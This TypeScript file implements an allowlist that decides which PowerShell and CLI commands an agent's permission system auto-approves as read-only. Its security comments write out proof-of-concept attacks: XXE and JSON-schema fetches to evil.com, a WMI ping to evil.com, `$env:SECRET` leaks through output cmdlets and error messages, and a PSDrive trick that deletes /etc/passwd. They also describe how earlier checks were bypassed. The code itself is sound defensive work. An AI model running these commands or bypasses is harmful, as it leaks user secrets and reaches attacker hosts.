/**
 * PowerShell read-only command validation.
 *
 * Cmdlets are case-insensitive; all matching is done in lowercase.
 */

import type {
  ParsedCommandElement,
  ParsedPowerShellCommand,
} from '../../utils/powershell/parser.js'

type ParsedStatement = ParsedPowerShellCommand['statements'][number]

import { getPlatform } from '../../utils/platform.js'
import {
  COMMON_ALIASES,
  deriveSecurityFlags,
  getPipelineSegments,
  isNullRedirectionTarget,
  isPowerShellParameter,
} from '../../utils/powershell/parser.js'
import type { ExternalCommandConfig } from '../../utils/shell/readOnlyCommandValidation.js'
import {
  DOCKER_READ_ONLY_COMMANDS,
  EXTERNAL_READONLY_COMMANDS,
  GH_READ_ONLY_COMMANDS,
  GIT_READ_ONLY_COMMANDS,
  validateFlags,
} from '../../utils/shell/readOnlyCommandValidation.js'
import { COMMON_PARAMETERS } from './commonParameters.js'

const DOTNET_READ_ONLY_FLAGS = new Set([
  '--version',
  '--info',
  '--list-runtimes',
  '--list-sdks',
])

type CommandConfig = {
  /** Safe subcommands or flags for this command */
  safeFlags?: string[]
  /**
   * When true, all flags are allowed regardless of safeFlags.
   * Use for commands whose entire flag surface is read-only (e.g., hostname).
   * Without this, an empty/missing safeFlags rejects all flags (positional
   * args only).
   */
  allowAllFlags?: boolean
  /** Regex constraint on the original command */
  regex?: RegExp
  /** Additional validation callback - returns true if command is dangerous */
  additionalCommandIsDangerousCallback?: (
    command: string,
    element?: ParsedCommandElement,
  ) => boolean
}

/**
 * Shared callback for cmdlets that print or coerce their args to stdout/
 * stderr. `Write-Output $env:SECRET` prints it directly; `Start-Sleep
 * $env:SECRET` leaks via type-coerce error ("Cannot convert value 'sk-...'
 * to System.Double"). Bash's echo regex WHITELISTS safe chars per token.
 *
 * Two checks:
 * 1. elementTypes whitelist — StringConstant (literals) + Parameter (flag
 *    names). Rejects Variable, Other (HashtableAst/ConvertExpressionAst/
 *    BinaryExpressionAst all map to Other), ScriptBlock, SubExpression,
 *    ExpandableString. Same pattern as SAFE_PATH_ELEMENT_TYPES.
 * 2. Colon-bound parameter value — `-InputObject:$env:SECRET` creates a
 *    SINGLE CommandParameterAst; the VariableExpressionAst is its .Argument
 *    child, not a separate CommandElement. elementTypes = [..., 'Parameter'],
 *    whitelist passes. Query children[] for the .Argument's mapped type;
 *    anything other than StringConstant (Variable, ParenExpression wrapping
 *    arbitrary pipelines, Hashtable, etc.) is a leak vector.
 */
export function argLeaksValue(
  _cmd: string,
  element?: ParsedCommandElement,
): boolean {
  const argTypes = (element?.elementTypes ?? []).slice(1)
  const args = element?.args ?? []
  const children = element?.children
  for (let i = 0; i < argTypes.length; i++) {
    if (argTypes[i] !== 'StringConstant' && argTypes[i] !== 'Parameter') {
      // ArrayLiteralAst (`Select-Object Name, Id`) maps to 'Other' — the
      // parse script only populates children for CommandParameterAst.Argument,
      // so we can't inspect elements. Fall back to string-archaeology on the
      // extent text: Hashtable has `@{`, ParenExpr has `(`, variables have
      // `$`, type literals have `[`, scriptblocks have `{`. A comma-list of
      // bare identifiers has none. `Name, $x` still rejects on `$`.
      if (!/[$(@{[]/.test(args[i] ?? '')) {
        continue
      }
      return true
    }
    if (argTypes[i] === 'Parameter') {
      const paramChildren = children?.[i]
      if (paramChildren) {
        if (paramChildren.some(c => c.type !== 'StringConstant')) {
          return true
        }
      } else {
        // Fallback: string-archaeology on arg text (pre-children parsers).
        // Reject `$` (variable), `(` (ParenExpressionAst), `@` (hash/array
        // sub), `{` (scriptblock), `[` (type literal/static method).
        const arg = args[i] ?? ''
        const colonIdx = arg.indexOf(':')
        if (colonIdx > 0 && /[$(@{[]/.test(arg.slice(colonIdx + 1))) {
          return true
        }
      }
    }
  }
  return false
}

/**
 * Allowlist of PowerShell cmdlets that are considered read-only.
 * Each cmdlet maps to its configuration including safe flags.
 *
 * Note: PowerShell cmdlets are case-insensitive, so we store keys in lowercase
 * and normalize input for matching.
 *
 * Uses Object.create(null) to prevent prototype-chain pollution — attacker-
 * controlled command names like 'constructor' or '__proto__' must return
 * undefined, not inherited Object.prototype properties. Same defense as
 * COMMON_ALIASES in parser.ts.
 */
export const CMDLET_ALLOWLIST: Record<string, CommandConfig> = Object.assign(
  Object.create(null) as Record<string, CommandConfig>,
  {
    // =========================================================================
    // PowerShell Cmdlets - Filesystem (read-only)
    // =========================================================================
    'get-childitem': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Filter',
        '-Include',
        '-Exclude',
        '-Recurse',
        '-Depth',
        '-Name',
        '-Force',
        '-Attributes',
        '-Directory',
        '-File',
        '-Hidden',
        '-ReadOnly',
        '-System',
      ],
    },
    'get-content': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-TotalCount',
        '-Head',
        '-Tail',
        '-Raw',
        '-Encoding',
        '-Delimiter',
        '-ReadCount',
      ],
    },
    'get-item': {
      safeFlags: ['-Path', '-LiteralPath', '-Force', '-Stream'],
    },
    'get-itemproperty': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'test-path': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-PathType',
        '-Filter',
        '-Include',
        '-Exclude',
        '-IsValid',
        '-NewerThan',
        '-OlderThan',
      ],
    },
    'resolve-path': {
      safeFlags: ['-Path', '-LiteralPath', '-Relative'],
    },
    'get-filehash': {
      safeFlags: ['-Path', '-LiteralPath', '-Algorithm', '-InputStream'],
    },
    'get-acl': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Audit',
        '-Filter',
        '-Include',
        '-Exclude',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - Navigation (read-only, just changes working directory)
    // =========================================================================
    'set-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'push-location': {
      safeFlags: ['-Path', '-LiteralPath', '-PassThru', '-StackName'],
    },
    'pop-location': {
      safeFlags: ['-PassThru', '-StackName'],
    },

    // =========================================================================
    // PowerShell Cmdlets - Text searching/filtering (read-only)
    // =========================================================================
    'select-string': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Pattern',
        '-InputObject',
        '-SimpleMatch',
        '-CaseSensitive',
        '-Quiet',
        '-List',
        '-NotMatch',
        '-AllMatches',
        '-Encoding',
        '-Context',
        '-Raw',
        '-NoEmphasis',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - Data conversion (pure transforms, no side effects)
    // =========================================================================
    'convertto-json': {
      safeFlags: [
        '-InputObject',
        '-Depth',
        '-Compress',
        '-EnumsAsStrings',
        '-AsArray',
      ],
    },
    'convertfrom-json': {
      safeFlags: ['-InputObject', '-Depth', '-AsHashtable', '-NoEnumerate'],
    },
    'convertto-csv': {
      safeFlags: [
        '-InputObject',
        '-Delimiter',
        '-NoTypeInformation',
        '-NoHeader',
        '-UseQuotes',
      ],
    },
    'convertfrom-csv': {
      safeFlags: ['-InputObject', '-Delimiter', '-Header', '-UseCulture'],
    },
    'convertto-xml': {
      safeFlags: ['-InputObject', '-Depth', '-As', '-NoTypeInformation'],
    },
    'convertto-html': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Head',
        '-Title',
        '-Body',
        '-Pre',
        '-Post',
        '-As',
        '-Fragment',
      ],
    },
    'format-hex': {
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-InputObject',
        '-Encoding',
        '-Count',
        '-Offset',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - Object inspection and manipulation (read-only)
    // =========================================================================
    'get-member': {
      safeFlags: [
        '-InputObject',
        '-MemberType',
        '-Name',
        '-Static',
        '-View',
        '-Force',
      ],
    },
    'get-unique': {
      safeFlags: ['-InputObject', '-AsString', '-CaseInsensitive', '-OnType'],
    },
    'compare-object': {
      safeFlags: [
        '-ReferenceObject',
        '-DifferenceObject',
        '-Property',
        '-SyncWindow',
        '-CaseSensitive',
        '-Culture',
        '-ExcludeDifferent',
        '-IncludeEqual',
        '-PassThru',
      ],
    },
    // SECURITY: select-xml REMOVED. XML external entity (XXE) resolution can
    // trigger network requests via DOCTYPE SYSTEM/PUBLIC references in -Content
    // or -Xml. `Select-Xml -Content '<!DOCTYPE x [<!ENTITY e SYSTEM
    // "http://evil.com/x">]><x>&e;</x>' -XPath '/'` sends a GET request.
    // PowerShell's XmlDocument.LoadXml doesn't disable entity resolution by
    // default. Removal forces prompt.
    'join-string': {
      safeFlags: [
        '-InputObject',
        '-Property',
        '-Separator',
        '-OutputPrefix',
        '-OutputSuffix',
        '-SingleQuote',
        '-DoubleQuote',
        '-FormatString',
      ],
    },
    // SECURITY: Test-Json REMOVED. -Schema (positional 1) accepts JSON Schema
    // with $ref pointing to external URLs — Test-Json fetches them (network
    // request). safeFlags only validates EXPLICIT flags, not positional binding:
    // `Test-Json '{}' '{"$ref":"http://evil.com"}'` → position 1 binds to
    // -Schema → safeFlags check sees two non-flag args, skips both → auto-allow.
    'get-random': {
      safeFlags: [
        '-InputObject',
        '-Minimum',
        '-Maximum',
        '-Count',
        '-SetSeed',
        '-Shuffle',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - Path utilities (read-only)
    // =========================================================================
    // convert-path's entire purpose is to resolve filesystem paths. It is now
    // in CMDLET_PATH_CONFIG for proper path validation, so safeFlags here only
    // list the path parameters (which CMDLET_PATH_CONFIG will validate).
    'convert-path': {
      safeFlags: ['-Path', '-LiteralPath'],
    },
    'join-path': {
      // -Resolve removed: it touches the filesystem to verify the joined path
      // exists, but the path was not validated against allowed directories.
      // Without -Resolve, Join-Path is pure string manipulation.
      safeFlags: ['-Path', '-ChildPath', '-AdditionalChildPath'],
    },
    'split-path': {
      // -Resolve removed: same rationale as join-path. Without -Resolve,
      // Split-Path is pure string manipulation.
      safeFlags: [
        '-Path',
        '-LiteralPath',
        '-Qualifier',
        '-NoQualifier',
        '-Parent',
        '-Leaf',
        '-LeafBase',
        '-Extension',
        '-IsAbsolute',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - Additional system info (read-only)
    // =========================================================================
    // NOTE: Get-Clipboard is intentionally NOT included - it can expose sensitive
    // data like passwords or API keys that the user may have copied. Bash also
    // does not auto-allow clipboard commands (pbpaste, xclip, etc.).
    'get-hotfix': {
      safeFlags: ['-Id', '-Description'],
    },
    'get-itempropertyvalue': {
      safeFlags: ['-Path', '-LiteralPath', '-Name'],
    },
    'get-psprovider': {
      safeFlags: ['-PSProvider'],
    },

    // =========================================================================
    // PowerShell Cmdlets - Process/System info
    // =========================================================================
    'get-process': {
      safeFlags: [
        '-Name',
        '-Id',
        '-Module',
        '-FileVersionInfo',
        '-IncludeUserName',
      ],
    },
    'get-service': {
      safeFlags: [
        '-Name',
        '-DisplayName',
        '-DependentServices',
        '-RequiredServices',
        '-Include',
        '-Exclude',
      ],
    },
    'get-computerinfo': {
      allowAllFlags: true,
    },
    'get-host': {
      allowAllFlags: true,
    },
    'get-date': {
      safeFlags: ['-Date', '-Format', '-UFormat', '-DisplayHint', '-AsUTC'],
    },
    'get-location': {
      safeFlags: ['-PSProvider', '-PSDrive', '-Stack', '-StackName'],
    },
    'get-psdrive': {
      safeFlags: ['-Name', '-PSProvider', '-Scope'],
    },
    // SECURITY: Get-Command REMOVED from allowlist. -Name (positional 0,
    // ValueFromPipeline=true) triggers module autoload which runs .psm1 init
    // code. Chain attack: pre-plant module in PSModulePath, trigger autoload.
    // Previously tried removing -Name/-Module from safeFlags + rejecting
    // positional StringConstant, but pipeline input (`'EvilCmdlet' | Get-Command`)
    // bypasses the callback entirely since args are empty. Removal forces
    // prompt. Users who need it can add explicit allow rule.
    'get-module': {
      safeFlags: [
        '-Name',
        '-ListAvailable',
        '-All',
        '-FullyQualifiedName',
        '-PSEdition',
      ],
    },
    // SECURITY: Get-Help REMOVED from allowlist. Same module autoload hazard
    // as Get-Command (-Name has ValueFromPipeline=true, pipeline input bypasses
    // arg-level callback). Removal forces prompt.
    'get-alias': {
      safeFlags: ['-Name', '-Definition', '-Scope', '-Exclude'],
    },
    'get-history': {
      safeFlags: ['-Id', '-Count'],
    },
    'get-culture': {
      allowAllFlags: true,
    },
    'get-uiculture': {
      allowAllFlags: true,
    },
    'get-timezone': {
      safeFlags: ['-Name', '-Id', '-ListAvailable'],
    },
    'get-uptime': {
      allowAllFlags: true,
    },

    // =========================================================================
    // PowerShell Cmdlets - Output & misc (no side effects)
    // =========================================================================
    // Bash parity: `echo` is auto-allowed via custom regex (BashTool
    // readOnlyValidation.ts:~1517). That regex WHITELISTS safe chars per arg.
    // See argLeaksValue above for the three attack shapes it blocks.
    'write-output': {
      safeFlags: ['-InputObject', '-NoEnumerate'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Write-Host bypasses the pipeline (Information stream, PS5+), so it's
    // strictly less capable than Write-Output — but the same
    // `Write-Host $env:SECRET` leak-via-display applies.
    'write-host': {
      safeFlags: [
        '-Object',
        '-NoNewline',
        '-Separator',
        '-ForegroundColor',
        '-BackgroundColor',
      ],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Bash parity: `sleep` is in READONLY_COMMANDS (BashTool
    // readOnlyValidation.ts:~1146). Zero side effects at runtime — but
    // `Start-Sleep $env:SECRET` leaks via type-coerce error. Same guard.
    'start-sleep': {
      safeFlags: ['-Seconds', '-Milliseconds', '-Duration'],
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Format-* and Measure-Object moved here from SAFE_OUTPUT_CMDLETS after
    // security review found all accept calculated-property hashtables (same
    // exploit as Where-Object — I4 regression). isSafeOutputCommand is a
    // NAME-ONLY check that filtered them out of the approval loop BEFORE arg
    // validation. Here, argLeaksValue validates args:
    //   | Format-Table               → no args → safe → allow
    //   | Format-Table Name, CPU     → StringConstant positionals → safe → allow
    //   | Format-Table $env:SECRET   → Variable elementType → blocked → passthrough
    //   | Format-Table @{N='x';E={}} → Other (HashtableAst) → blocked → passthrough
    //   | Measure-Object -Property $env:SECRET → same → blocked
    // allowAllFlags: argLeaksValue validates arg elementTypes (Variable/Hashtable/
    // ScriptBlock → blocked). Format-* flags themselves (-AutoSize, -GroupBy,
    // -Wrap, etc.) are display-only. Without allowAllFlags, the empty-safeFlags
    // default rejects ALL flags — `Format-Table -AutoSize` would over-prompt.
    'format-table': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-list': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-wide': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'format-custom': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'measure-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Select-Object/Sort-Object/Group-Object/Where-Object: same calculated-
    // property hashtable surface as format-* (about_Calculated_Properties).
    // Removed from SAFE_OUTPUT_CMDLETS but previously missing here, causing
    // `Get-Process | Select-Object Name` to over-prompt. argLeaksValue handles
    // them identically: StringConstant property names pass (`Select-Object Name`),
    // HashtableAst/ScriptBlock/Variable args block (`Select-Object @{N='x';E={...}}`,
    // `Where-Object { ... }`). allowAllFlags: -First/-Last/-Skip/-Descending/
    // -Property/-EQ etc. are all selection/ordering flags — harmless on their own;
    // argLeaksValue catches the dangerous arg *values*.
    'select-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'sort-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'group-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'where-object': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    // Out-String/Out-Host moved here from SAFE_OUTPUT_CMDLETS — both accept
    // -InputObject which leaks the same way Write-Output does.
    // `Get-Process | Out-String -InputObject $env:SECRET` → secret prints.
    // allowAllFlags: -Width/-Stream/-Paging/-NoNewline are display flags;
    // argLeaksValue catches the dangerous -InputObject *value*.
    'out-string': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },
    'out-host': {
      allowAllFlags: true,
      additionalCommandIsDangerousCallback: argLeaksValue,
    },

    // =========================================================================
    // PowerShell Cmdlets - Network info (read-only)
    // =========================================================================
    'get-netadapter': {
      safeFlags: [
        '-Name',
        '-InterfaceDescription',
        '-InterfaceIndex',
        '-Physical',
      ],
    },
    'get-netipaddress': {
      safeFlags: [
        '-InterfaceIndex',
        '-InterfaceAlias',
        '-AddressFamily',
        '-Type',
      ],
    },
    'get-netipconfiguration': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias', '-Detailed', '-All'],
    },
    'get-netroute': {
      safeFlags: [
        '-InterfaceIndex',
        '-InterfaceAlias',
        '-AddressFamily',
        '-DestinationPrefix',
      ],
    },
    'get-dnsclientcache': {
      // SECURITY: -CimSession/-ThrottleLimit excluded. -CimSession connects to
      // a remote host (network request). Previously empty config = all flags OK.
      safeFlags: ['-Entry', '-Name', '-Type', '-Status', '-Section', '-Data'],
    },
    'get-dnsclient': {
      safeFlags: ['-InterfaceIndex', '-InterfaceAlias'],
    },

    // =========================================================================
    // PowerShell Cmdlets - Event log (read-only)
    // =========================================================================
    'get-eventlog': {
      safeFlags: [
        '-LogName',
        '-Newest',
        '-After',
        '-Before',
        '-EntryType',
        '-Index',
        '-InstanceId',
        '-Message',
        '-Source',
        '-UserName',
        '-AsBaseObject',
        '-List',
      ],
    },
    'get-winevent': {
      // SECURITY: -FilterXml/-FilterHashtable removed. -FilterXml accepts XML
      // with DOCTYPE external entities (XXE → network request). -FilterHashtable
      // would be caught by the elementTypes 'Other' check since @{} is
      // HashtableAst, but removal is explicit. Same XXE hazard as Select-Xml
      // (removed above). -FilterXPath kept (string pattern only, no entity
      // resolution). -ComputerName/-Credential also implicitly excluded.
      safeFlags: [
        '-LogName',
        '-ListLog',
        '-ListProvider',
        '-ProviderName',
        '-Path',
        '-MaxEvents',
        '-FilterXPath',
        '-Force',
        '-Oldest',
      ],
    },

    // =========================================================================
    // PowerShell Cmdlets - WMI/CIM
    // =========================================================================
    // SECURITY: Get-WmiObject and Get-CimInstance REMOVED. They actively
    // trigger network requests via classes like Win32_PingStatus (sends ICMP
    // when enumerated) and can query remote computers via -ComputerName/
    // CimSession. -Class/-ClassName/-Filter/-Query accept arbitrary WMI
    // classes/WQL that we cannot statically validate.
    //   PoC: Get-WmiObject -Class Win32_PingStatus -Filter 'Address="evil.com"'
    //   → sends ICMP to evil.com (DNS leak + potential NTLM auth leak).
    // WMI can also auto-load provider DLLs (init code). Removal forces prompt.
    // get-cimclass stays — only lists class metadata, no instance enumeration.
    'get-cimclass': {
      safeFlags: [
        '-ClassName',
        '-Namespace',
        '-MethodName',
        '-PropertyName',
        '-QualifierName',
      ],
    },

    // =========================================================================
    // Git - uses shared external command validation with per-flag checking
    // =========================================================================
    git: {},

    // =========================================================================
    // GitHub CLI (gh) - uses shared external command validation
    // =========================================================================
    gh: {},

    // =========================================================================
    // Docker - uses shared external command validation
    // =========================================================================
    docker: {},

    // =========================================================================
    // Windows-specific system commands
    // =========================================================================
    ipconfig: {
      // SECURITY: On macOS, `ipconfig set <iface> <mode>` configures network
      // (writes system config). safeFlags only validates FLAGS, positional args
      // are SKIPPED. Reject any positional argument — only bare `ipconfig` or
      // `ipconfig /all` (read-only display) allowed. Windows ipconfig only uses
      // /flags (display), macOS ipconfig uses subcommands (get/set/waitall).
      safeFlags: ['/all', '/displaydns', '/allcompartments'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        return (element?.args ?? []).some(
          a => !a.startsWith('/') && !a.startsWith('-'),
        )
      },
    },
    netstat: {
      safeFlags: [
        '-a',
        '-b',
        '-e',
        '-f',
        '-n',
        '-o',
        '-p',
        '-q',
        '-r',
        '-s',
        '-t',
        '-x',
        '-y',
      ],
    },
    systeminfo: {
      safeFlags: ['/FO', '/NH'],
    },
    tasklist: {
      safeFlags: ['/M', '/SVC', '/V', '/FI', '/FO', '/NH'],
    },
    // where.exe: Windows PATH locator, bash `which` equivalent. Reaches here via
    // SAFE_EXTERNAL_EXES bypass at the nameType gate in isAllowlistedCommand.
    // All flags are read-only (/R /F /T /Q), matching bash's treatment of `which`
    // in BashTool READONLY_COMMANDS.
    'where.exe': {
      allowAllFlags: true,
    },
    hostname: {
      // SECURITY: `hostname NAME` on Linux/macOS SETS the hostname (writes to
      // system config). `hostname -F FILE` / `--file=FILE` also sets from file.
      // Only allow bare `hostname` and known read-only flags.
      safeFlags: ['-a', '-d', '-f', '-i', '-I', '-s', '-y', '-A'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        // Reject any positional (non-flag) argument — sets hostname.
        return (element?.args ?? []).some(a => !a.startsWith('-'))
      },
    },
    whoami: {
      safeFlags: [
        '/user',
        '/groups',
        '/claims',
        '/priv',
        '/logonid',
        '/all',
        '/fo',
        '/nh',
      ],
    },
    ver: {
      allowAllFlags: true,
    },
    arp: {
      safeFlags: ['-a', '-g', '-v', '-N'],
    },
    route: {
      safeFlags: ['print', 'PRINT', '-4', '-6'],
      additionalCommandIsDangerousCallback: (
        _cmd: string,
        element?: ParsedCommandElement,
      ) => {
        // SECURITY: route.exe syntax is `route [-f] [-p] [-4|-6] VERB [args...]`.
        // The first non-flag positional is the verb. `route add 10.0.0.0 mask
        // 255.0.0.0 192.168.1.1 print` adds a route (print is a trailing display
        // modifier). The old check used args.some('print') which matched 'print'
        // anywhere — position-insensitive.
        if (!element) {
          return true
        }
        const verb = element.args.find(a => !a.startsWith('-'))
        return verb?.toLowerCase() !== 'print'
      },
    },
    // netsh: intentionally NOT allowlisted. Three rounds of denylist gaps in PR
    // #22060 (verb position → dash flags → slash flags → more verbs) proved
    // the grammar is too complex to allowlist safely: 3-deep context nesting
    // (`netsh interface ipv4 show addresses`), dual-prefix flags (-f / /f),
    // script execution via -f and `exec`, remote RPC via -r, offline-mode
    // commit, wlan connect/disconnect, etc. Each denylist expansion revealed
    // another gap. `route` stays — `route print` is the only read-only form,
    // simple single-verb-position grammar.
    getmac: {
      safeFlags: ['/FO', '/NH', '/V'],
    },

    // =========================================================================
    // Cross-platform CLI tools
    // =========================================================================
    // File inspection
    // SECURITY: file -C compiles a magic database and WRITES to disk. Only
    // allow introspection flags; reject -C / --compile / -m / --magic-file.
    file: {
      safeFlags: [
        '-b',
        '--brief',
        '-i',
        '--mime',
        '-L',
        '--dereference',
        '--mime-type',
        '--mime-encoding',
        '-z',
        '--uncompress',
        '-p',
        '--preserve-date',
        '-k',
        '--keep-going',
        '-r',
        '--raw',
        '-v',
        '--version',
        '-0',
        '--print0',
        '-s',
        '--special-files',
        '-l',
        '-F',
        '--separator',
        '-e',
        '-P',
        '-N',
        '--no-pad',
        '-E',
        '--extension',
      ],
    },
    tree: {
      safeFlags: ['/F', '/A', '/Q', '/L'],
    },
    findstr: {
      safeFlags: [
        '/B',
        '/E',
        '/L',
        '/R',
        '/S',
        '/I',
        '/X',
        '/V',
        '/N',
        '/M',
        '/O',
        '/P',
        // Flag matching strips ':' before comparison (e.g., /C:pattern → /C),
        // so these entries must NOT include the trailing colon.
        '/C',
        '/G',
        '/D',
        '/A',
      ],
    },

    // =========================================================================
    // Package managers - uses shared external command validation
    // =========================================================================
    dotnet: {},

    // SECURITY: man and help direct entries REMOVED. They aliased Get-Help
    // (also removed — see above). Without these entries, lookupAllowlist
    // resolves via COMMON_ALIASES to 'get-help' which is not in allowlist →
    // prompt. Same module-autoload hazard as Get-Help.
  },
)

/**
 * Safe output/formatting cmdlets that can receive piped input.
 * Stored as canonical cmdlet names in lowercase.
 */
const SAFE_OUTPUT_CMDLETS = new Set([
  'out-null',
  // NOT out-string/out-host — both accept -InputObject which leaks args the
  // same way Write-Output does. Moved to CMDLET_ALLOWLIST with argLeaksValue.
  // `Get-Process | Out-String -InputObject $env:SECRET` — Out-String was
  // filtered name-only, the $env arg was never validated.
  // out-null stays: it discards everything, no -InputObject leak.
  // NOT foreach-object / where-object / select-object / sort-object /
  // group-object / format-table / format-list / format-wide / format-custom /
  // measure-object — ALL accept calculated-property hashtables or script-block
  // predicates that evaluate arbitrary expressions at runtime
  // (about_Calculated_Properties). Examples:
  //   Where-Object @{k=$env:SECRET}       — HashtableAst arg, 'Other' elementType
  //   Select-Object @{N='x';E={...}}      — calculated property scriptblock
  //   Format-Table $env:SECRET            — positional -Property, prints as header
  //   Measure-Object -Property $env:SECRET — leaks via "property 'sk-...' not found"
  //   ForEach-Object { $env:PATH='e' }    — arbitrary script body
  // isSafeOutputCommand is a NAME-ONLY check — step-5 filters these out of
  // the approval loop BEFORE arg validation runs. With them here, an
  // all-safe-output tail auto-allows on empty subCommands regardless of
  // what the arg contains. Removing them forces the tail through arg-level
  // validation (hashtable is 'Other' elementType → fails the whitelist at
  // isAllowlistedCommand → ask; bare $var is 'Variable' → same).
  //
  // NOT write-output — pipeline-initial $env:VAR is a VariableExpressionAst,
  // skipped by getSubCommandsForPermissionCheck (non-CommandAst). With
  // write-output here, `$env:SECRET | Write-Output` → WO filtered as
  // safe-output → empty subCommands → auto-allow → secret prints. The
  // CMDLET_ALLOWLIST entry handles direct `Write-Output 'literal'`.
])

/**
 * Cmdlets moved from SAFE_OUTPUT_CMDLETS to CMDLET_ALLOWLIST with
 * argLeaksValue. These are pipeline-tail transformers (Format-*,
 * Measure-Object, Select-Object, etc.) that were previously name-only
 * filtered as safe-output. They now require arg validation (argLeaksValue
 * blocks calculated-property hashtables / scriptblocks / variable args).
 *
 * Used by isAllowlistedPipelineTail for the narrow fallback in
 * checkPermissionMode and isReadOnlyCommand — these callers need the same
 * "skip harmless pipeline tail" behavior as SAFE_OUTPUT_CMDLETS but with
 * the argLeaksValue guard.
 */
const PIPELINE_TAIL_CMDLETS = new Set([
  'format-table',
  'format-list',
  'format-wide',
  'format-custom',
  'measure-object',
  'select-object',
  'sort-object',
  'group-object',
  'where-object',
  'out-string',
  'out-host',
])

/**
 * External .exe names allowed past the nameType='application' gate.
 *
 * classifyCommandName returns 'application' for any name containing a dot,
 * which the nameType gate at isAllowlistedCommand rejects before allowlist
 * lookup. That gate exists to block scripts\Get-Process → stripModulePrefix →
 * cmd.name='Get-Process' spoofing. But it also catches benign PATH-resolved
 * .exe names like where.exe (bash `which` equivalent — pure read, no dangerous
 * flags).
 *
 * SECURITY: the bypass checks the raw first token of cmd.text, NOT cmd.name.
 * stripModulePrefix collapses scripts\where.exe → cmd.name='where.exe', but
 * cmd.text preserves the raw 'scripts\where.exe ...'. Matching cmd.text's
 * first token defeats that spoofing — only a bare `where.exe` (PATH lookup)
 * gets through.
 *
 * Each entry here MUST have a matching CMDLET_ALLOWLIST entry for flag
 * validation.
 */
const SAFE_EXTERNAL_EXES = new Set(['where.exe'])

/**
 * Windows PATHEXT extensions that PowerShell resolves via PATH lookup.
 * `git.exe`, `git.cmd`, `git.bat`, `git.com` all invoke git at runtime and
 * must resolve to the same canonical name so git-safety guards fire.
 * .ps1 is intentionally excluded — a script named git.ps1 is not the git
 * binary and does not trigger git's hook mechanism.
 */
const WINDOWS_PATHEXT = /\.(exe|cmd|bat|com)$/

/**
 * Resolves a command name to its canonical cmdlet name using COMMON_ALIASES.
 * Strips Windows executable extensions (.exe, .cmd, .bat, .com) from path-free
 * names so e.g. `git.exe` canonicalises to `git` and triggers git-safety
 * guards (powershellPermissions.ts hasGitSubCommand). SECURITY: only strips
 * when the name has no path separator — `scripts\git.exe` is a relative path
 * (runs a local script, not PATH-resolved git) and must NOT canonicalise to
 * `git`. Returns lowercase canonical name.
 */
export function resolveToCanonical(name: string): string {
  let lower = name.toLowerCase()
  // Only strip PATHEXT on bare names — paths run a specific file, not the
  // PATH-resolved executable the guards are protecting against.
  if (!lower.includes('\\') && !lower.includes('/')) {
    lower = lower.replace(WINDOWS_PATHEXT, '')
  }
  const alias = COMMON_ALIASES[lower]
  if (alias) {
    return alias.toLowerCase()
  }
  return lower
}

/**
 * Checks if a command name (after alias resolution) alters the path-resolution
 * namespace for subsequent statements in the same compound command.
 *
 * Covers TWO classes:
 * 1. Cwd-changing cmdlets: Set-Location, Push-Location, Pop-Location (and
 *    aliases cd, sl, chdir, pushd, popd). Subsequent relative paths resolve
 *    from the new cwd.
 * 2. PSDrive-creating cmdlets: New-PSDrive (and aliases ndr, mount on Windows).
 *    Subsequent drive-prefixed paths (p:/foo) resolve via the new drive root,
 *    not via the filesystem. Finding #21: `New-PSDrive -Name p -Root /etc;
 *    Remove-Item p:/passwd` — the validator cannot know p: maps to /etc.
 *
 * Any compound containing one of these cannot have its later statements'
 * relative/drive-prefixed paths validated against the stale validator cwd.
 *
 * Name kept for BashTool parity (isCwdChangingCmdlet ↔ compoundCommandHasCd);
 * semantically this is "alters path-resolution namespace".
 */
export function isCwdChangingCmdlet(name: string): boolean {
  const canonical = resolveToCanonical(name)
  return (
    canonical === 'set-location' ||
    canonical === 'push-location' ||
    canonical === 'pop-location' ||
    // New-PSDrive creates a drive mapping that redirects <name>:/... paths
    // to an arbitrary filesystem root. Aliases ndr/mount are not in
    // COMMON_ALIASES — check them explicitly (finding #21).
    canonical === 'new-psdrive' ||
    // ndr/mount are PS aliases for New-PSDrive on Windows only. On POSIX,
    // 'mount' is the native mount(8) command; treating it as PSDrive-creating
    // would false-positive. (bug #15 / review nit)
    (getPlatform() === 'windows' &&
      (canonical === 'ndr' || canonical === 'mount'))
  )
}

/**
 * Checks if a command name (after alias resolution) is a safe output cmdlet.
 */
export function isSafeOutputCommand(name: string): boolean {
  const canonical = resolveToCanonical(name)
  return SAFE_OUTPUT_CMDLETS.has(canonical)
}

/**
